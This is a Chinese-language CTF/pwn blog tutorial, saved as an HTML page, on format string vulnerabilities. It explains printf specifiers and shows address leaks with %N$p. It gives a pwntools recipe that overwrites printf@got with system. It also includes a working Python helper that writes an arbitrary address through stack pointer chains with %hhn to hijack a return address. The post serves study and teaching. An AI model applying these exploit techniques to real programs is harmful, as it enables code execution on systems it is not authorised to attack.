@@ -1,0 +1,738 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    
+    <meta property="og:site_name" content="#3">
+    <meta property="og:type" content="article">
+
+    
+    <meta property="og:image" content="img/cover.jpg">
+    <meta property="twitter:image" content="img/cover.jpg" />
+    
+
+    
+    <meta name="title" content="格式化字符串漏洞由浅入深" />
+    <meta property="og:title" content="格式化字符串漏洞由浅入深" />
+    <meta property="twitter:title" content="格式化字符串漏洞由浅入深" />
+    
+
+    
+    <meta name="description" content="本文先通过介绍格式化字符串漏洞的成因，然后简单介绍其利用场景和利用方法，最后通过一个例子来讲解非栈段格式化字符串的利用方法">
+    <meta property="og:description" content="本文先通过介绍格式化字符串漏洞的成因，然后简单介绍其利用场景和利用方法，最后通过一个例子来讲解非栈段格式化字符串的利用方法" />
+    <meta property="twitter:description" content="本文先通过介绍格式化字符串漏洞的成因，然后简单介绍其利用场景和利用方法，最后通过一个例子来讲解非栈段格式化字符串的利用方法" />
+    
+
+    
+    <meta property="twitter:card" content="summary" />
+    
+    
+
+    <meta name="keyword"  content="Zephyr, Zephyr, Zephyr, , Zephyr的网络日志, Zephyr的博客, Zephyr Blog, 博客, 个人网站, 互联网, Web, CTF,">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>格式化字符串漏洞由浅入深 | Zephyr的博客 | Zephyr Blog | Zephyr#3 | #3 |</title>
+
+    <link rel="canonical" href="/fmtperspective/">
+
+    
+    
+    
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    
+    <link rel="stylesheet" href="/css/hugo-theme-cleanwhite.min.css">
+
+    
+    <link rel="stylesheet" href="/css/zanshang.css">
+
+    
+    <link rel="stylesheet" href="/css/font-awesome.all.min.css">
+
+    
+    
+
+    
+    <script src="/js/jquery.min.js"></script>
+
+    
+    <script src="/js/bootstrap.min.js"></script>
+
+    
+    <script src="/js/hux-blog.min.js"></script>
+
+    
+    <script src="/js/lazysizes.min.js"></script>
+
+    
+    
+ 
+ <script>
+    MathJax = {
+      tex: {
+        inlineMath: [
+          ["$", "$"],
+          ["\\(", "\\)"],
+        ],
+        displayMath: [
+          ["$$", "$$"],
+          ["\\[", "\\]"],
+        ],
+        processEscapes: true,
+        processEnvironments: true,
+      },
+      options: {
+        skipHtmlTags: ["script", "noscript", "style", "textarea", "pre"],
+      },
+    };
+  
+    window.addEventListener("load", (event) => {
+      document.querySelectorAll("mjx-container").forEach(function (x) {
+        x.parentElement.classList += "has-jax";
+      });
+    });
+  </script>
+  <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+  <script
+    type="text/javascript"
+    id="MathJax-script"
+    async
+    src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"
+  ></script>
+</head>
+<style>
+    code.has-jax {
+      -webkit-font-smoothing: antialiased;
+      background: inherit !important;
+      border: none !important;
+      font-size: 100%;
+    }
+    </style>
+
+
+
+
+
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+
+    <div class="container-fluid">
+        
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">#3</a>
+        </div>
+
+        
+        
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">All Posts</a>
+                    </li>
+                    
+                        
+                        <li>
+                            <a href="/categories/tech/">tech</a>
+                        </li>
+                        
+                    
+                    
+		    
+                        <li><a href="/about//">ABOUT</a></li>
+                    
+                        <li><a href="/life//">LIFE</a></li>
+                    
+                        <li><a href="/course//">HISTORY</a></li>
+                    
+		            <li>
+                        <a href="/search"><i class="fa fa-search"></i></a>
+		           </li>
+                </ul>
+            </div>
+        </div>
+        
+    </div>
+    
+</nav>
+<script>
+    
+    
+    
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        
+            $navbar.className = " ";
+            
+            setTimeout(function(){
+                
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+
+
+<style type="text/css">
+    header.intro-header {
+        background-image: url('/img/cover.jpg')
+    }
+</style>
+
+<header class="intro-header" >
+
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <div class="tags">
+                        
+                        <a class="tag" href="/tags/ctf" title="CTF">
+                            CTF
+                        </a>
+                        
+                        <a class="tag" href="/tags/pwn" title="pwn">
+                            pwn
+                        </a>
+                        
+                    </div>
+                    <h1>格式化字符串漏洞由浅入深</h1>
+                    <h2 class="subheading"></h2>
+                    <span class="meta">
+                        
+                            Posted by 
+                            
+                                Zephyr
+                             
+                            on 
+                            Monday, July 29, 2024
+                            
+                            
+                            
+                            
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+
+
+
+<article>
+    <div class="container">
+        <div class="row">
+
+            
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                
+                <h1 id="原理介绍">原理介绍</h1>
+<h2 id="格式化字符串函数">格式化字符串函数</h2>
+<p>格式化字符串函数可以接受可变数量的参数，并将第一个参数作为格式化字符串，根据其来解析之后的参数。通俗来说，格式化字符串函数就是将计算机内存中表示的数据转化为我们人类可读的字符串格式。几乎所有的 C/C++ 程序都会利用格式化字符串函数来输出信息，调试程序，或者处理字符串。</p>
+<p>
+  <img src="image.png" alt="alt text">
+
+</p>
+<p>常见的格式化字符串函数有</p>
+<ul>
+<li>输入: <code>scanf</code></li>
+<li>输出
+
+  <img src="image-1.png" alt="alt text">
+
+</li>
+</ul>
+<h2 id="格式化字符串">格式化字符串</h2>
+<p>一个基本的格式化字符串形式如下</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>%<span style="color:#ff79c6">[</span>parameter<span style="color:#ff79c6">][</span>flags<span style="color:#ff79c6">][</span>field width<span style="color:#ff79c6">][</span>.precision<span style="color:#ff79c6">][</span>length<span style="color:#ff79c6">]</span><span style="color:#8be9fd;font-style:italic">type</span>
+</span></span></code></pre></div><p><code>parameter</code>: 例如 <code>n$</code>获取格式化字符串中的指定参数。例如如果我们后续需要泄露的地址 是格式化字符串的参数5，那么我们就可以用<code>%5$p</code>写到缓冲区中，然后下一次程序调用格式化字符串函数时就会将这个参数位置的内容当做一个指针，并将他解引用，输出指针指向的值，从而泄露出<strong>对应地址的值</strong>。</p>
+<p><code>field width</code>:输出的最小宽度</p>
+<p><code>precision</code>:输出的最大宽度
+<code>length</code>:输出的长度，其中 <code>h</code>输出一个双字节，<code>hh</code>输出一个单字节，这个在任意地址写中非常推荐。</p>
+<p><code>type</code>: <code>d/i</code>表示有符号整数，</p>
+<p><code>u</code>表示无符号整数，</p>
+<p><code>x/X</code>16 进制 unsigned int 。x 使用小写字母；X 使用大写字母。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空。</p>
+<p><code>o</code>表示8进制unsigned int,如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空。</p>
+<p><code>c</code>如果没有用 l 标志，把 int 参数转为 unsigned char 型输出；如果用了 l 标志，把 wint_t 参数转为包含两个元素的 wchart_t 数组，其中第一个元素包含要输出的字符，第二个元素为 null 宽字符。</p>
+<p><code>p</code>void * 型，输出对应变量的值。printf(&quot;%p&quot;,a) 用地址的格式打印变量 a 的值，printf(&quot;%p&quot;, &amp;a) 打印变量 a 所在的地址。</p>
+<p><code>n</code>,不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。</p>
+<h2 id="格式化字符串漏洞成因">格式化字符串漏洞成因</h2>
+<p>
+  <img src="image-2.png" alt="alt text">
+
+</p>
+<p>如果这个格式化字符串是放在栈上的，那么在进入格式化字符串前，栈上的布局是这样的</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>some value
+</span></span><span style="display:flex;"><span>3.14
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">123456</span>
+</span></span><span style="display:flex;"><span>addr of <span style="color:#f1fa8c">&#34;red&#34;</span>
+</span></span><span style="display:flex;"><span>addr of format string: Color %s...
+</span></span></code></pre></div><p>如果我们在格式化字符串中的参数和后面传入的参数数量不匹配，那么格式化字符串函数就会在栈上取一些本来不应该被我们知道的值当做参数传递给格式化字符串，并根据需要来解释成对应的值。</p>
+<h1 id="利用">利用</h1>
+<h2 id="基础样例">基础样例</h2>
+<p>我们用一个相对通用的<code>fmt</code>题目作为本次的例子
+
+  <img src="image-3.png" alt="alt text">
+
+
+简单的读入用户的输入放到<code>buf</code>中，然后就利用<code>printf</code>将<code>buf</code>中的内容输出了。</p>
+<h2 id="任意地址读取">任意地址读取</h2>
+<p>格式化字符串可以泄露需要的地址。</p>
+<p>
+  <img src="image-4.png" alt="alt text">
+
+</p>
+<p>如图，我们发现返回地址所在的栈地址是<code>0x7fff2f3ad088</code>,于是我们可以在gdb中输入<code>fmtarg 0x7fff2f3ad088</code>，然后会得到<code>The index of format argument : 7 (&quot;\%6$p&quot;)</code>，得知参数是7，于是我们构造<code>%7$p</code>，发送，然后收到的地址就是<code>0x7f2eb9829d90</code>，也就是<code>__libc_start_call_main+128</code>，我们就可以算出<code>libc_base</code>，我们同样可以用相同的办法想泄露什么就泄露什么。</p>
+<h2 id="覆盖内存数据">覆盖内存数据</h2>
+<p>在<code>printf</code>中，如果我们输入一个<code>%{tag}c%{chain_a_offset}$hhn</code>这样的payload,其中<code>n</code>代表将前面输出的字符的长度都写入到对应的内存中。</p>
+<p>例如下面代码</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#8be9fd">int</span> namelength;
+</span></span><span style="display:flex;"><span><span style="color:#50fa7b">printf</span>(<span style="color:#f1fa8c">&#34;%s%n&#34;</span>,name <span style="color:#ff79c6">&amp;</span>namelength);
+</span></span><span style="display:flex;"><span><span style="color:#50fa7b">printf</span>(<span style="color:#f1fa8c">&#34;The name was %d bytes long&#34;</span>, namelength);
+</span></span></code></pre></div><p>这样我们可以在用户输入名字的时候，自动就统计出名字的长度，因此 <code>%n</code>这种参数是有实际意义的。</p>
+<p>笔者推荐使用<code>hnn</code>单字节覆写，因为如果使用<code>hn</code>在打远程的时候，要传太多数据，容易爆炸。</p>
+<h2 id="题外话-pwntools_fmtstr_payload">题外话-pwntools_fmtstr_payload</h2>
+<p><code>pwntools</code>提供了一个打<code>fmt</code>的自动化工具<code>Fmtstr</code>类，其中<code>fmtstr_payload</code>函数可以自动化生成<code>payload</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">fmtstr_payload</span>(offset, writes, numbwritten<span style="color:#ff79c6">=</span><span style="color:#bd93f9">0</span>, write_size<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;byte&#39;</span>, write_size_max<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;long&#39;</span>, overflows<span style="color:#ff79c6">=</span><span style="color:#bd93f9">16</span>, strategy<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;small&#34;</span>, badbytes<span style="color:#ff79c6">=</span><span style="color:#8be9fd;font-style:italic">frozenset</span>(), offset_bytes<span style="color:#ff79c6">=</span><span style="color:#bd93f9">0</span>):
+</span></span><span style="display:flex;"><span>    sz <span style="color:#ff79c6">=</span> WRITE_SIZE[write_size]
+</span></span><span style="display:flex;"><span>    szmax <span style="color:#ff79c6">=</span> WRITE_SIZE[write_size_max]
+</span></span><span style="display:flex;"><span>    all_atoms <span style="color:#ff79c6">=</span> make_atoms(writes, sz, szmax, numbwritten, overflows, strategy, badbytes)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    fmt <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">for</span> _ <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">1000000</span>):
+</span></span><span style="display:flex;"><span>        data_offset <span style="color:#ff79c6">=</span> (offset_bytes <span style="color:#ff79c6">+</span> <span style="color:#8be9fd;font-style:italic">len</span>(fmt)) <span style="color:#ff79c6">//</span> context<span style="color:#ff79c6">.</span>bytes
+</span></span><span style="display:flex;"><span>        fmt, data <span style="color:#ff79c6">=</span> make_payload_dollar(offset <span style="color:#ff79c6">+</span> data_offset, all_atoms, numbwritten<span style="color:#ff79c6">=</span>numbwritten)
+</span></span><span style="display:flex;"><span>        fmt <span style="color:#ff79c6">=</span> fmt <span style="color:#ff79c6">+</span> cyclic((<span style="color:#ff79c6">-</span><span style="color:#8be9fd;font-style:italic">len</span>(fmt)<span style="color:#ff79c6">-</span>offset_bytes) <span style="color:#ff79c6">%</span> context<span style="color:#ff79c6">.</span>bytes)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> <span style="color:#8be9fd;font-style:italic">len</span>(fmt) <span style="color:#ff79c6">+</span> offset_bytes <span style="color:#ff79c6">==</span> data_offset <span style="color:#ff79c6">*</span> context<span style="color:#ff79c6">.</span>bytes:
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">break</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">else</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">raise</span> RuntimeError(<span style="color:#f1fa8c">&#34;this is a bug ... format string building did not converge&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> fmt <span style="color:#ff79c6">+</span> data
+</span></span></code></pre></div><p>其中<code>classpwnlib.fmtstr.FmtStr(execute_fmt, offset=None, padlen=0, numbwritten=0)</code>函数，</p>
+<ul>
+<li><code>execute_fmt</code>：与漏洞进程交互的函数</li>
+<li><code>offset</code>：控制的第一个格式化程序的偏移</li>
+<li><code>padlen</code>：在payload前添加的填充大小</li>
+<li><code>numbwritten</code>：已经写入的字节数</li>
+</ul>
+<p>例如如果<strong>格式化字符串存在栈上</strong>我们可以用</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">get_vuln_offset</span>(payload):
+</span></span><span style="display:flex;"><span>    p<span style="color:#ff79c6">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>    info <span style="color:#ff79c6">=</span> p<span style="color:#ff79c6">.</span>recv()
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> info
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>vuln_offset <span style="color:#ff79c6">=</span> FmtStr(get_vuln_offset)<span style="color:#ff79c6">.</span>offset
+</span></span><span style="display:flex;"><span>log,info(<span style="color:#f1fa8c">&#34;vuln_offset =&gt; </span><span style="color:#f1fa8c">%s</span><span style="color:#f1fa8c">&#34;</span> <span style="color:#ff79c6">%</span> <span style="color:#8be9fd;font-style:italic">hex</span>(vuln_offset))
+</span></span></code></pre></div><p>来自动获得格式化字符串的偏移，您可以在自己实验的时候发现<code>pwntools</code>会发送大量的<code>payload</code>来实现自动化获取偏移。</p>
+<p><code>fmtstr_payload</code>用来自动化生成格式化字符串payload
+其格式如下</p>
+<pre tabindex="0"><code class="language-pythoon" data-lang="pythoon">pwnlib.fmtstr.fmtstr_payload(offset, writes, numbwritten=0, write_size=&#39;byte&#39;) → str
+</code></pre><ul>
+<li><code>offset</code>：控制的第一个格式化程序的偏移</li>
+<li><code>writes</code>：为字典，用于往addr中写入value，例如**{addr:** value, addr2: value2}</li>
+<li><code>numbwritten</code>：已经由printf写入的字节数</li>
+<li><code>write_size</code>：必须是byte/short/int其中之一，指定按什么数据宽度写（%hhn/%hn/%n）</li>
+</ul>
+<p>例如我们常遇到的题是将<code>printf@got</code>写成<code>system</code>，然后往buf里面传一个<code>/bin/sh</code>，然后下一次执行<code>printf</code>的时候，实际上执行的是<code>system</code>
+我们可以</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>payload <span style="color:#ff79c6">=</span> fmtstr_payload(<span style="color:#ff79c6">&lt;</span>your offset<span style="color:#ff79c6">&gt;</span>,{printf_got : system})
+</span></span></code></pre></div><p>其中我们需要得到<code>printf@got</code>的地址，还有<code>system</code>的地址，因此我们需要先知道<code>libc_base</code>，如果开了<code>PIE</code>，我们可以随便泄露一个栈上存在的有关于<code>elf</code>的地址，然后根据<code>ida64</code>中的地址来算出<code>elf_base</code>，这是绕过<code>PIE</code>的常用手段，因为页表是<code>4K</code>对齐的，因此低3位是固定的。</p>
+<h2 id="非栈上格式化字符串">非栈上格式化字符串</h2>
+<p>本题中的格式化字符串存在<code>.bss</code>段上，<code>fmtstr_payload</code>失效，我们需要手搓<code>payload</code>来地址。</p>
+<p>本题中保护全开，因此我们需要先泄露<code>elf_base</code>，泄露<code>libc_base</code>,然后算出<code>backdoor</code>的地址，然后利用格式化字符串漏洞覆盖返回地址，跳转到后门。</p>
+<p>将断点断在<code>printf@got</code>前，查看栈上的内容</p>
+<p>
+  <img src="image-5.png" alt="alt text">
+
+</p>
+<p>我们发现<code>0x7fff2f3ad0c8</code>地址中存的是<code>main</code>的地址，然后用<code>ida</code>查看，偏移是<code>0x127F</code>，因此我们可以泄露出main的地址，然后减去0x127F即可，<code>libc_base</code>同理，直接泄露返回地址即可。</p>
+<p>然后是覆盖内存，需要我们在栈上找一个栈地址链。</p>
+<p>
+  <img src="image-6.png" alt="alt text">
+
+</p>
+<p>例如<code>0x7fff2f3ad0a8 —▸ 0x7fff2f3ad198 —▸ 0x7fff2f3af22a ◂— 0x4853006e77702f2e /</code> 就是环境变量链。</p>
+<p>我们将他们分别对应为 <code>a-&gt;b-&gt;c</code>，我们可以先拿到<code>0x7fff2f3ad0a8</code>的偏移，再拿到<code>0x7fff2f3ad198</code>的偏移，分别是<code>11</code>和<code>41</code>，当我们用形如<code>%{tag}c%{chain_a_offset}$hhn</code>的payload的时候，假如我们输入的偏移是<code>0x7fff2f3ad0a8</code>的偏移，调用<code>printf</code>的时候，程序就会解析<code>0x7fff2f3ad0a8</code>存储的内容，是<code>0x7fff2f3ad198</code>，然后由于<code>0x7fff2f3ad198</code>是一个指针，<code>printf</code>会在<code>printf_positional</code>中解引用这个地址，然后修改<code>0x7fff2f3ad198</code>指向的内容，也就是<code>0x7fff2f3af22a</code>，这样我们就实现了在<code>a-&gt;b-&gt;c</code>链条中传入<code>a</code>的偏移，可以修改<code>c</code>的最低位($hhn)。</p>
+<p>为了实现将一整个地址写入(64位也就是64个bytes)。我们可以在刚才的<code>a-&gt;b-&gt;c</code>链条中，利用<code>a</code>来修改<code>c</code>的最低位，然后拿到<code>b</code>的偏移，然后可以修改到<code>c</code>所指的内容，也就是在<code>a-&gt;b-&gt;c-&gt;d</code>中，我们先用<code>a</code>每次更改<code>c</code>的最低字节，每次+1，然后再用<code>b</code>来修改<code>d</code>，这样就可以写完整个地址。</p>
+<p>为此，我们需要写一个模板函数</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">fmt_write</span>(chain_a_offset,chain_b_offset,write_addr):
+</span></span><span style="display:flex;"><span>    count <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>
+</span></span><span style="display:flex;"><span>    write_addr_list <span style="color:#ff79c6">=</span> split_address_to_bytes(write_addr)
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># p.sendafter(&#34;Do you know repeater\n&#34;,f&#34;%{chain_c_offset}$p&#34;)</span>
+</span></span><span style="display:flex;"><span>    p<span style="color:#ff79c6">.</span>sendafter(<span style="color:#f1fa8c">&#34;Do you know repeater</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>,<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;%</span><span style="color:#f1fa8c">{</span>chain_b_offset<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">$p&#34;</span>)
+</span></span><span style="display:flex;"><span>    p<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;0x&#39;</span>)
+</span></span><span style="display:flex;"><span>    chain_c_addr<span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">int</span>(p<span style="color:#ff79c6">.</span>recv(<span style="color:#bd93f9">12</span>),<span style="color:#bd93f9">16</span>)
+</span></span><span style="display:flex;"><span>    success(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;chain_c_addr--&gt;</span><span style="color:#f1fa8c">{</span><span style="color:#8be9fd;font-style:italic">hex</span>(chain_c_addr)<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># chain_c_addr= int(p.recvline(),16)</span>
+</span></span><span style="display:flex;"><span>    p<span style="color:#ff79c6">.</span>sendafter(<span style="color:#f1fa8c">&#34;Do you know repeater</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>,<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;%</span><span style="color:#f1fa8c">{</span>chain_a_offset<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">$p&#34;</span>)
+</span></span><span style="display:flex;"><span>    p<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;0x&#39;</span>)
+</span></span><span style="display:flex;"><span>    chain_b_addr<span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">int</span>(p<span style="color:#ff79c6">.</span>recv(<span style="color:#bd93f9">12</span>),<span style="color:#bd93f9">16</span>)
+</span></span><span style="display:flex;"><span>    origin_low_bytes <span style="color:#ff79c6">=</span>chain_c_addr <span style="color:#ff79c6">&amp;</span> <span style="color:#bd93f9">0xFF</span> 
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># 将最低字节和8对齐</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> origin_low_bytes <span style="color:#ff79c6">%</span> <span style="color:#bd93f9">0x08</span> <span style="color:#ff79c6">!=</span> <span style="color:#bd93f9">0</span>:
+</span></span><span style="display:flex;"><span>        origin_low_bytes <span style="color:#ff79c6">&amp;=</span> <span style="color:#bd93f9">0xF8</span>
+</span></span><span style="display:flex;"><span>    chain_c_offset <span style="color:#ff79c6">=</span> (chain_c_addr <span style="color:#ff79c6">-</span> chain_b_addr)  <span style="color:#ff79c6">//</span> <span style="color:#bd93f9">8</span> <span style="color:#ff79c6">+</span> chain_b_offset <span style="color:#6272a4"># use the bias to caculate the chain_c_offset in order to bypass the PIE </span>
+</span></span><span style="display:flex;"><span>    success(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;origin:</span><span style="color:#f1fa8c">{</span><span style="color:#8be9fd;font-style:italic">hex</span>(origin_low_bytes)<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
+</span></span><span style="display:flex;"><span>    success(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;chain_c_offset-&gt;&gt;</span><span style="color:#f1fa8c">{</span><span style="color:#8be9fd;font-style:italic">hex</span>(chain_c_offset)<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">for</span> addr_byte <span style="color:#ff79c6">in</span> write_addr_list:
+</span></span><span style="display:flex;"><span>        tag <span style="color:#ff79c6">=</span> origin_low_bytes <span style="color:#ff79c6">+</span> count <span style="color:#6272a4"># we use a-&gt;b-&gt;c-&gt;d  a-&gt;c-&gt;d  c每次地址+1 然后在用B可以改到D</span>
+</span></span><span style="display:flex;"><span>        p<span style="color:#ff79c6">.</span>sendafter(<span style="color:#f1fa8c">&#34;Do you know repeater</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>,<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;%</span><span style="color:#f1fa8c">{</span>tag<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">c%</span><span style="color:#f1fa8c">{</span>chain_a_offset<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">$hhn&#34;</span>) <span style="color:#6272a4"># 修改C的低位</span>
+</span></span><span style="display:flex;"><span>        p<span style="color:#ff79c6">.</span>sendafter(<span style="color:#f1fa8c">&#34;Do you know repeater</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>,<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;%</span><span style="color:#f1fa8c">{</span>addr_byte<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">c%</span><span style="color:#f1fa8c">{</span>chain_b_offset<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">$hhn&#34;</span>)  <span style="color:#6272a4"># 利用B往D里写一个byte</span>
+</span></span><span style="display:flex;"><span>        count <span style="color:#ff79c6">+=</span> <span style="color:#bd93f9">1</span> 
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># write 2bytes 0</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">12</span>):
+</span></span><span style="display:flex;"><span>        tag <span style="color:#ff79c6">=</span> origin_low_bytes <span style="color:#ff79c6">+</span> count
+</span></span><span style="display:flex;"><span>        p<span style="color:#ff79c6">.</span>sendafter(<span style="color:#f1fa8c">&#34;Do you know repeater</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>,<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;%</span><span style="color:#f1fa8c">{</span>tag<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">c%</span><span style="color:#f1fa8c">{</span>chain_a_offset<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">$hhn&#34;</span>) <span style="color:#6272a4"># 修改C的低位</span>
+</span></span><span style="display:flex;"><span>        p<span style="color:#ff79c6">.</span>sendafter(<span style="color:#f1fa8c">&#34;Do you know repeater</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>,<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;%</span><span style="color:#f1fa8c">{</span>chain_b_offset<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">$hhn&#34;</span>)  <span style="color:#6272a4"># 利用B往D里写一个byte</span>
+</span></span><span style="display:flex;"><span>        count<span style="color:#ff79c6">+=</span><span style="color:#bd93f9">1</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># p.sendafter()</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># recover the c low bytesbyte</span>
+</span></span><span style="display:flex;"><span>    p<span style="color:#ff79c6">.</span>sendafter(<span style="color:#f1fa8c">&#34;Do you know repeater</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>,<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;%</span><span style="color:#f1fa8c">{</span>origin_low_bytes<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">c%</span><span style="color:#f1fa8c">{</span>chain_a_offset<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">$hhn&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> chain_c_offset
+</span></span></code></pre></div><p>
+  <img src="image-7.png" alt="alt text">
+
+
+执行之后
+
+  <img src="image-8.png" alt="alt text">
+
+
+我们成功将<code>c</code>后面写上了<code>返回地址</code>的栈地址，这个栈地址指向我们的<code>返回地址</code>。</p>
+<p><strong>注：在64位系统中，fmt是按照8来寻址的，也就是栈地址需要对齐8，比如原来我们的链子中<code>c</code>是<code>0x7fff2f3af22a</code>，我们需要手动将他修正为<code>8</code>,要不第二次打fmt的时候就无法写入数据了。</strong></p>
